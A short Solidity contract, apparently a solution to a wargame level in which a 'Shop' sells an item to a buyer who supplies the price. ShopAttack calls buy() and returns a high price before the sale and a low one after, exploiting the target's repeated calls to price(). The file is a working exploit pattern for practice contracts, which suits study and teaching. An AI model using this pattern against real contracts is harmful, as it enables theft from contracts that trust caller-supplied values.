// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
    function buy() external ;
    function isSold() external view returns (bool);
}

contract ShopAttack {
    
    Shop public  shop;

    constructor(address _shop)  {
        shop = Shop(_shop);
    }

    function attack() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
      if (!shop.isSold()){
        return 100;
      } else {
        return 1;
      }
    }

}